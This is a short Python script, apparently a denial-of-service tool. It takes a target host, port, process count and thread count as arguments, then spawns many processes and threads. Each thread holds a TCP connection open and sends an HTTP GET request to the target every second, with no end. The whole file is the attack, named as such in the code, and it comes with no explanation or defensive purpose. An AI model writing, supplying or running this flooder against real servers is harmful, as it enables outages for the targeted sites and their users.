import socket
import time
import threading
import multiprocessing
import sys
HOST = sys.argv[1]  # The server's hostname or IP address
PORT = sys.argv[2]  # The port used by the server
def attack():
    try:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.connect((HOST, int(PORT)))
          while 1:
              s.send("GET / HTTP/1.1\r\nHost:{}\r\n\r\n".format(sys.argv[1]).encode())
              time.sleep(1)
    except:pass

def threads():
     for i in range(int(sys.argv[4])):
        th=threading.Thread(target=attack,daemon= False)
        th.start()
        time.sleep(0.001)

if __name__=='__main__':
    try:
      multiprocessing.set_start_method('spawn')
      for i in range(int(sys.argv[3])):
          p = multiprocessing.Process(target=threads,name="Python Subprocess",daemon=False)
          p.start()
    except KeyboardInterrupt:
        pass
